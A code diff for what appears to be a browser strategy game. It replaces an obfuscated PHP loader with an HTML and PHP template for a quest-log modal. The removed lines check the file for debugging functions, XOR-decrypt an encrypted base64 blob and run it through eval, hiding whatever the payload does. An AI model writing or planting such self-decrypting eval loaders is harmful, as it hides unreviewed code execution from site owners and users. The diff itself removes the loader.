@@ -1,24 +1,142 @@
-<?php
-$ktbhvjz="81663582019e2d70bbf9da2476dcd914";
-$qdzouf="5a5557065102085006030a54570605035450070a025503510f000252065f500d";
-$rzidbhn="Gr6MajlY61QiTBzhmqKLG9oy8B6vQtu9cb1TTDrnbGHZ2WokK+xsS2eRmwmLzR0cpB46wUOqjGiwJWLg58SvwKwT30NG3d5F8TNsA/co9FTWBe8SZbrCm82dXX19Z6TOz9uSo4Rr25cdkk1j3AbWjbNb+wPeKLL9/1JkI/w0KEBeYjLKJsc0Kqi+sgpk7n6W72oxH4FX0dzW7W+pcVz68gBL5di5e8BO8FETV0SOiuTQhZrdDDaPXgzwgvjuE7QF8rU43DJ+khY6IroUdHHCZKB4W25cvJqYYKBBa43LsONB3zRBA1KDQjp4yXkvSXWNrQ4sc2KrrafsbZFAzOnpIDczicNiUaLNba065wyVVDEQQetJV23Fd6ZSLx7VTTm0j0opqNaYmvUNG85/8YvOYo0mE7LvRFlhX1Kd9RQyXyCK36H8Nmmt2eUF7dWi7sVQpkAn/qYTFvh7+nEbKAbBhbDntvNSZVYIlZR/vv8xvnpakjxyHJOIkfhOLPGlKisnOUL0lyFMoKW+Y8fc2+fG4xlnG0bIbpqUtWfkkNBf8h1FszHLRltArsDEcyljl+auXi75CBGnScPIvN8SKiTBFeuwcb06dSp13idP/uSXNcnwNyTfeP51r+324mJZQS4ZwDbEurmK7YKFBepB/6Uj/GSQsI0J/QgogzDgX1yhHOIJ06tx+1suwdjhXYzaiWvj3UObtibRO52Un9MgxdNdkCYFOsaM8e2KcShbiz9LkwI/jn1PbU1e+NYXMRcl7NCz4eLA0K8nxfMBH2Do/bthReDPm2BX0HEacs/8A9CH4w9wbibJ4p4C09W/b30DtdL+3tEB25O1yjNV6eLM44F7BcwOp8tJ1MuqicOnW0ByUSn5PjLmMz6HzwezzzFT/seAjF5ztmIVnSmbZ9GVbkjj71K8E4S1uiVc463PYhMymp5AwRO2Xn736tF4BXrOJOiZl6ddGBaaP6S59iZGip25O/Hn9TPhD+PLhqpgrNMxp3j4EEZ8ri3/auF6lcvvv/JayQv7lfQvyq3jB5b5LA0VaHy2Xu/lFNnRFR3dO7zSythpiGB1qzirU/9LhQYrWTAXMz+oTHuVRjXZBNMg0G4MfYppp8i9PmD8J7U1+aUFEUeQMmiB5jaW8igrfZNwJnQnspXORuVfuxQJ6j04mU46n13Kd+roXG2TX7UHnAd9u8PWwxQZL89l15zSPLssajf7DVGRM0OtQCTxcANYzEiUs4trCgUQmoeImfh0766aBwIdDxGngYLYSXFhsKPkPoSBxDYFeNVnRW2swTZo+vU/5rEC45cnEjYD4V/F+0980pHg7qy80GU+FeZHPjg+NDx/k9vhPyRQYuzkVHHvDHKLc0AIwHfxPP2DCNKSk4WB2lfb4Fcgka+IwosYZGIfFKpAi4oYYMmBCK2azo2PxyNpRI/rwXXO+OSLAhENRAE5bACKuCBEyiO3F8pApQey9hgLaDevbov5JzVyEMPsZqwY+cXlY/d+Oox/5l5AjMu92RH8izU9WWNbk1E61eL8LT9XDApv5HRitM+GErevwEjn9PZFngDrxR5/S7Kgpf5a+oV+xEOWS0um5l6cLJZ67SZ6o7/GJOt7BQQEtA5ICL+h/KZzgAjpRzxN9EO3QTE6y2GSEePsLlTvwJrwURydNiFHdUDDaRZdySrahiTAXelKvxjQELceoK0ZEeQn0iVTmGCY6s4067v6KolKCYAR6ufnIctZuBrob4HbPp9pgYMqqPJUwjxlZ3SpVko9JDRYoq1ocpWfcdkJqnPjrWq3haX6EJbE2KSj9loGfKx9UNQuBgyQYmpIsCRuaKnutfYLOEQ4GcSlPeGaT2+kY8sO6VOYk5Z7zpr10b/PcbHvCgJ2kXhzY5vpQTuoLjo6UXkAsGZcOGPDVLIgIKiHC14XWEXKZjREsnsRGmKpDEw8Z7I3XqO/MPEFAUC/E4gmOpBJyYOI/pdUjQ3AWPz3rcyaYUJZ2sw=";
-$gjeboxzg=file_get_contents(__FILE__);
-$jynfjwwddi=str_replace($rzidbhn,"",$gjeboxzg);
-if(strpos($jynfjwwddi,"ec"."ho")!==false||strpos($jynfjwwddi,"pr"."int")!==false||strpos($jynfjwwddi,"var_"."dump")!==false||strpos($jynfjwwddi,"file_put_"."contents")!==false||strpos($jynfjwwddi,"fw"."rite")!==false){die();}
-$yrjbauszk=str_replace(array($ktbhvjz,$qdzouf),array("SP_63016c4c","KP_0e6440b3"),$gjeboxzg);
-$rnojwazcp=md5($yrjbauszk);
-$tisiwabr=hex2bin($qdzouf);
-$yrfsqwvd="";
-$csmddvw=strlen($rnojwazcp);
-for($eegngcvryv=0;$eegngcvryv<$csmddvw;$eegngcvryv++){
-$yrfsqwvd.=chr(ord($tisiwabr[$eegngcvryv])^ord($rnojwazcp[$eegngcvryv]));
-}
-$grtoqnf=base64_decode($rzidbhn);
-$fhhsdgs=strlen($grtoqnf);
-$bgkoddhv="";
-$oyonvwcwkw=strlen($yrfsqwvd);
-for($eegngcvryv=0;$eegngcvryv<$fhhsdgs;$eegngcvryv++){
-$bgkoddhv.=$grtoqnf[$eegngcvryv]^$yrfsqwvd[$eegngcvryv%$oyonvwcwkw];
-}
-$krxjsdhi="gzun"."compress";
-eval('?>' . $krxjsdhi($bgkoddhv) . '<?php ');
+<!-- Questlog Modal -->
+<div id="questlogModal"
+    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10000; align-items: center; justify-content: center;">
+    <div
+        style="position: relative; width: 820px; max-height: 90vh; margin: 20px auto; background: url('/graphic/new/popup/content_background.webp'); background-size: cover; border-image: url('/graphic/new/popup/border.webp') 30 round; border-width: 30px; border-style: solid; box-shadow: 0 4px 30px rgba(0,0,0,0.8); overflow: hidden;">
+
+        <!-- Close Button -->
+        <button onclick="closeQuestlogModal()"
+            style="position: absolute; top: 5px; right: 5px; background: url('/graphic/index/login_close.png') no-repeat center; background-size: contain; border: none; width: 24px; height: 24px; cursor: pointer; opacity: 0.9; z-index: 10001;"
+            onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='0.9'"></button>
+
+        <!-- Header Image -->
+        <div
+            style="width: 100%; height: 100px; background: url('/graphic/quests_new/questline_1.png') center/cover; border-bottom: 3px solid #5c3c1f;">
+        </div>
+
+        <!-- Tabs -->
+        <div
+            style="display: flex; background: linear-gradient(180deg, #8B4513 0%, #6b3410 100%); border-bottom: 2px solid #3c2610; padding: 5px 10px;">
+            <div class="quest-tab active" onclick="switchQuestTab('main')"
+                style="flex: 1; text-align: center; padding: 8px 15px; margin: 0 3px; background: linear-gradient(180deg, #a0522d 0%, #8B4513 100%); color: white; font-weight: bold; font-size: 13px; cursor: pointer; border-radius: 3px 3px 0 0; border: 1px solid #5c3c1f;">
+                <?= __('quests.tabs.main_quests') ?>
+            </div>
+            <div class="quest-tab" onclick="switchQuestTab('tribe')"
+                style="flex: 1; text-align: center; padding: 8px 15px; margin: 0 3px; background: linear-gradient(180deg, #7a5c3f 0%, #5c3c1f 100%); color: #ddd; font-weight: bold; font-size: 13px; cursor: pointer; border-radius: 3px 3px 0 0; border: 1px solid #3c2610;">
+                <?= __('quests.tabs.tribe_quest') ?>
+            </div>
+            <div class="quest-tab" onclick="switchQuestTab('rewards')"
+                style="flex: 1; text-align: center; padding: 8px 15px; margin: 0 3px; background: linear-gradient(180deg, #7a5c3f 0%, #5c3c1f 100%); color: #ddd; font-weight: bold; font-size: 13px; cursor: pointer; border-radius: 3px 3px 0 0; border: 1px solid #3c2610;">
+                <?= __('quests.tabs.rewards') ?> (2)
+            </div>
+        </div>
+
+        <!-- Content Area -->
+        <div style="display: flex; min-height: 450px; max-height: 500px; overflow: hidden;">
+
+            <!-- Left Sidebar - Quest Categories -->
+            <div
+                style="width: 250px; background: rgba(0,0,0,0.3); border-right: 2px solid #5c3c1f; overflow-y: auto; padding: 10px;">
+
+                <!-- Construction -->
+                <div class="quest-category active" onclick="selectQuestCategory('construction')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #8B4513; background: linear-gradient(180deg, #f4e4bc 0%, #e9d0a9 100%); border-radius: 3px; overflow: hidden;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_1.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.construction') ?>
+                        </div>
+                    </div>
+                    <div
+                        style="padding: 8px; background: #f4e4bc; text-align: center; font-size: 11px; color: #5c3c1f;">
+                        <?= __('quests.questlines.path_of_conquest_1') ?>
+                    </div>
+                </div>
+
+                <!-- Looting -->
+                <div class="quest-category" onclick="selectQuestCategory('looting')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #666; background: linear-gradient(180deg, #ddd 0%, #ccc 100%); border-radius: 3px; overflow: hidden; opacity: 0.7;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_2.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.looting') ?>
+                        </div>
+                    </div>
+                    <div style="padding: 8px; background: #ddd; text-align: center; font-size: 11px; color: #666;">
+                        <?= __('quests.questlines.victory') ?>
+                    </div>
+                </div>
+
+                <!-- Diplomacy -->
+                <div class="quest-category" onclick="selectQuestCategory('diplomacy')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #666; background: linear-gradient(180deg, #ddd 0%, #ccc 100%); border-radius: 3px; overflow: hidden; opacity: 0.7;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_5.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.diplomacy') ?>
+                        </div>
+                    </div>
+                    <div style="padding: 8px; background: #ddd; text-align: center; font-size: 11px; color: #666;">
+                        <?= __('quests.questlines.make_contacts') ?>
+                    </div>
+                </div>
+
+                <!-- Premium -->
+                <div class="quest-category" onclick="selectQuestCategory('premium')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #666; background: linear-gradient(180deg, #ddd 0%, #ccc 100%); border-radius: 3px; overflow: hidden; opacity: 0.7;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_8.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.premium') ?>
+                        </div>
+                    </div>
+                    <div style="padding: 8px; background: #ddd; text-align: center; font-size: 11px; color: #666;">
+                        <?= __('quests.questlines.inventory') ?>
+                    </div>
+                </div>
+
+                <!-- Recruitment -->
+                <div class="quest-category" onclick="selectQuestCategory('recruitment')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #666; background: linear-gradient(180deg, #ddd 0%, #ccc 100%); border-radius: 3px; overflow: hidden; opacity: 0.7;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_9.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.recruitment') ?>
+                        </div>
+                    </div>
+                    <div style="padding: 8px; background: #ddd; text-align: center; font-size: 11px; color: #666;">
+                        <?= __('quests.questlines.build_army_5') ?>
+                    </div>
+                </div>
+
+                <!-- Relics -->
+                <div class="quest-category" onclick="selectQuestCategory('relics')"
+                    style="margin-bottom: 5px; cursor: pointer; border: 2px solid #666; background: linear-gradient(180deg, #ddd 0%, #ccc 100%); border-radius: 3px; overflow: hidden; opacity: 0.7;">
+                    <div
+                        style="position: relative; height: 80px; background: url('/graphic/quests_new/questline_11.png') center/cover;">
+                        <div
+                            style="position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); padding: 5px; color: white; font-weight: bold; font-size: 12px; text-align: center;">
+                            <?= __('quests.categories.relics') ?>
+                        </div>
+                    </div>
+                    <div style="padding: 8px; background: #ddd; text-align: center; font-size: 11px; color: #666;">
+                        <?= __('quests.questlines.find_relic') ?>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Right Content - Quest Details -->
+            <div id="questContent" style="flex: 1; padding: 20px; overflow-y: auto; background: rgba(244,228,188,0.3);">
+                <!-- Content will be loaded here dynamically -->
+                <?php include __DIR__ . '/components/questlog_content.php'; ?>
+            </div>
+        </div>
+
+    </div>
+</div>
